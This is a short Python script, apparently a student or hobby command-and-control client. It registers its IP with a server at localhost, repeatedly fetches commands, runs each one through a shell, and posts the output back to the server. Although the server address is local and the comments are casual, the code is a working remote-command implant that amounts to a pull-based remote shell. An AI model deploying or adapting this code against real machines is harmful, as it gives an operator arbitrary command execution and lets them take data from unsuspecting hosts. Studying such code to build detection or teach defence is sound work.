import requests
import subprocess
import time

SERVER_URL = "http://127.0.0.1:5000"

# commands = {} # keep history of commands executed on this client?
# jk its in server now

# client reaches out to server to get told its ID
def log_client():
    # get ip
    ip = subprocess.run("ifconfig | grep 129 | grep inet | awk '{print $2}'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
    # hostname -I
    response = requests.get(f"{SERVER_URL}/log-client", params={'client_id': ip}) # send ip

    # response = requests.get(f"{SERVER_URL}/log-client")
    if response.status_code == 200:
        return response.json()['client_id'] # need server to return to the client what its ID is
    else:
        return None

def get_command():
    response = requests.get(f"{SERVER_URL}/command") # GET command from server
    if response.status_code == 200: # if request was successful
        cmd = response.json().get('command')
        return cmd
    else:
        return None

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
        return result.stdout.decode('utf-8') + result.stderr.decode('utf-8') # decode standard output
    except subprocess.CalledProcessError as e: # umm uhh
        return str(e)

def main():
    # client_id = log_client()
    # print("!!!!!!!!!!CLIENT ID:", client_id)
    try:
        client_id = log_client()
        print("!!!!!!!!!!CLIENT ID:", client_id) # get id by visiting server/log-client, which means that server runs log_client() and gives client an id
        # does this mean that i need to make client send its ip first off without asking server for a command?
        # client_id = "12345"
        while True:
            cmd = get_command()
            if cmd == "disconnect":
                print("disconnected")
                # make it send "client [client_id] disconnected"
                requests.post(SERVER_URL, params={'client_id': client_id, 'status': 'disconnected'}) # this works too
                break
            result = execute_command(cmd)
            requests.post(SERVER_URL, json={"result": result}, params={'client': client_id, 'status': 'connected'}) # this goes hard
            print("hi from client")
            time.sleep(10)
    except:
        print("*crickets*")

if __name__ == "__main__":
    main()